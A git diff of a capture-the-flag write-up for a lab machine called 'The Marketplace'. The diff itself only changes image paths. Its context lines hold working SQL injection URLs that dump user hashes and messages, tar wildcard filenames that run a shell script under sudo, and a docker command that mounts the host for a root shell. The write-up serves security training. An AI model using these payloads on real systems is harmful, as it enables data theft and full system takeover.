@@ -50,13 +50,13 @@ We're dealing with a web-heavy Linux machine so I like to run Gobuster directory
 
 The webpage on port 80 greets us with a barren site for selling various items.
 
-![](../assets/img/2026-01-28-TheMarketplace/1.png)
+![](/assets/img/2026-01-28-TheMarketplace/1.png)
 
 I create a new account and have a look at different features we have access to. Upon doing so, I see we're able to list new items and publish them to the page. I quickly test for HTML injection and find that I'm able to bolden my description string using `<b> INPUT </b>` which most likely means this site is vulnerable to XSS.
 
 Another feature of the site is to report any listings to an admin for the page's safekeeping and is meant to keep things orderly. I also notice when we login, the site gives us a JWT in order to track our role, username, etc.
 
-![](../assets/img/2026-01-28-TheMarketplace/2.png)
+![](/assets/img/2026-01-28-TheMarketplace/2.png)
 
 ## Grabbing Cookie with XSS
 Things are starting to look bad for the marketplace. Let's create a new listing with an XSS payload that will capture the user's cookie and send it to our own HTTP server.
@@ -69,22 +69,22 @@ I make a new listing with our payload in the description. This is the one I defa
 
 Then we can report it to an administrator and see about stealing a privileged JWT in order to impersonate them.
 
-![](../assets/img/2026-01-28-TheMarketplace/3.png)
+![](/assets/img/2026-01-28-TheMarketplace/3.png)
 
 Almost immediately after sending it, I get a response from the server. Ignore the first one as that is our own browser reaching out to us. Also, if you're having trouble reporting the listing, navigate to a different one, hit report, and change the URL to the malicious listing. This payload works by redirecting the user to an attacker-owned web server so getting to the report page can be difficult.
 
 Now let's supply that token in our browser's local storage and look for newly acquired things to exploit. The first of three flags is hosted here as well.
 
-![](../assets/img/2026-01-28-TheMarketplace/4.png)
+![](/assets/img/2026-01-28-TheMarketplace/4.png)
 
 There is an administration panel that allows us to manage posts being made on the site, with the only real option to delete the user. This gives us a few usernames to work with, but the real kicker is how the site queries for these posts.
 
-![](../assets/img/2026-01-28-TheMarketplace/5.png)
+![](/assets/img/2026-01-28-TheMarketplace/5.png)
 
 ## SQL Injection
 As reflected in the URL, it takes in a 'user' parameter and displays all results from the query to the database onto the page. Let's test for SQL injection with a few special characters and see about enumerating a database.
 
-![](../assets/img/2026-01-28-TheMarketplace/6.png)
+![](/assets/img/2026-01-28-TheMarketplace/6.png)
 
 Bingo, now we know the server is running MySQL and is prone to injection attacks. I'll enumerate this DB manually for fun using [this article](https://portswigger.net/web-security/sql-injection) as reference. You can also capture a request in Burp Suite and send it to SQLmap for a quick scan to make things a bit easier.
 
@@ -92,7 +92,7 @@ Bingo, now we know the server is running MySQL and is prone to injection attacks
 /admin?user=0 UNION SELECT 1,2,3,4-- -
 ```
 
-![](../assets/img/2026-01-28-TheMarketplace/7.png)
+![](/assets/img/2026-01-28-TheMarketplace/7.png)
 
 Ok there are four columns, next is databases.
 
@@ -100,7 +100,7 @@ Ok there are four columns, next is databases.
 /admin?user=0 UNION SELECT 1,group_concat(schema_name),3,4 from information_schema.schemata-- -
 ```
 
-![](../assets/img/2026-01-28-TheMarketplace/8.png)
+![](/assets/img/2026-01-28-TheMarketplace/8.png)
 
 We probably want the marketplace one, so let's grab all the table names from it.
 
@@ -108,7 +108,7 @@ We probably want the marketplace one, so let's grab all the table names from it.
 /admin?user=0%20UNION%20select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=%20%27marketplace%27--%20-
 ```
 
-![](../assets/img/2026-01-28-TheMarketplace/9.png)
+![](/assets/img/2026-01-28-TheMarketplace/9.png)
 
 Now let's dump all columns in the users table to potentially grab any hashes from the DB.
 
@@ -116,7 +116,7 @@ Now let's dump all columns in the users table to potentially grab any hashes fro
 /admin?user=0 union select group_concat(column_name,'\n'),2,3,4 from information_schema. columns where table_name='users' -- -
 ```
 
-![](../assets/img/2026-01-28-TheMarketplace/10.png)
+![](/assets/img/2026-01-28-TheMarketplace/10.png)
 
 Lastly, let's dump everything in the users table.
 
@@ -124,7 +124,7 @@ Lastly, let's dump everything in the users table.
 /admin?user=0 union select 1,group_concat(id,':',username,':',password,':', isAdministrator,'\n'),3,4 from marketplace.users --
 ```
 
-![](../assets/img/2026-01-28-TheMarketplace/11.png)
+![](/assets/img/2026-01-28-TheMarketplace/11.png)
 
 We get a few hashes for system, jake, and michael, but sending them over to hashcat doesn't give us any passwords. I enumerate the database some more and find a 'messages' table.
 
@@ -132,7 +132,7 @@ We get a few hashes for system, jake, and michael, but sending them over to hash
 /admin?user=0 union select group_concat(column_name,'\n'),2,3,4 from information_schema.columns where table_name='messages'-- -
 ```
 
-![](../assets/img/2026-01-28-TheMarketplace/12.png)
+![](/assets/img/2026-01-28-TheMarketplace/12.png)
 
 ## Initial Foothold
 Displaying message_content to the page gives us a paragraph saying that an unnamed user has a weak SSH password and that it has been changed to a new temporary one for the time being.
@@ -141,7 +141,7 @@ Displaying message_content to the page gives us a paragraph saying that an unnam
 /admin?user=0 union select 1,group_concat(message_content,'\n'),3,4 from marketplace.messages-- -
 ```
 
-![](../assets/img/2026-01-28-TheMarketplace/13.png)
+![](/assets/img/2026-01-28-TheMarketplace/13.png)
 
 I use this temp password with the names gathered from the users DB and get a successful login as Jake. Now we can begin looking at routes for privilege escalation and also grab the second flag under Jake's home dir.
 
@@ -156,7 +156,7 @@ michael:x:1002:1002:,,,:/home/michael:/bin/bash
 
 We'll probably have to pivot to Michael's account before root user, so I start looking for files owned by him. There is a `backups.sh` script under `/opt` which will use the tar binary on specified file and output it to `/opt/backups/backup.tar`.
 
-![](../assets/img/2026-01-28-TheMarketplace/14.png)
+![](/assets/img/2026-01-28-TheMarketplace/14.png)
 
 ## Privilege Escalation
 Turns out we also have access to run this script using sudo as Michael. There is an exploit where we create malicious filenames and have the tar binary execute those as flags to then run a script owned by us.
@@ -169,11 +169,11 @@ echo "" > "--checkpoint-action=exec=sh shell.sh"
 echo "" > --checkpoint=1
 ```
 
-![](../assets/img/2026-01-28-TheMarketplace/15.png)
+![](/assets/img/2026-01-28-TheMarketplace/15.png)
 
 Now we are in as Michael, next stop is root so let's restart enumeration for privilege escalation. Listing the groups we're in shows that we are apart of Docker. If the system is misconfigured, we can actually leverage our rights to this group to mount the filesystem and spawn a shell.
 
-![](../assets/img/2026-01-28-TheMarketplace/16.png)
+![](/assets/img/2026-01-28-TheMarketplace/16.png)
 
 [GTFOBins](https://gtfobins.org/gtfobins/docker/#shell) has a great method for spawning a root shell using a docker command.
 
@@ -183,6 +183,6 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
 
 This works by effectively mounting the host filesystem onto a root container and then `chroot`-ing into it, allowing us to grab a shell as root user.
 
-![](../assets/img/2026-01-28-TheMarketplace/17.png)
+![](/assets/img/2026-01-28-TheMarketplace/17.png)
 
 After that last command, we can grab the final flag at `/root/root.txt` to complete the box. I really liked this box as the web exploits fun to do and the privesc techniques are neat. I hope this was helpful to anyone following along or stuck and happy hacking!
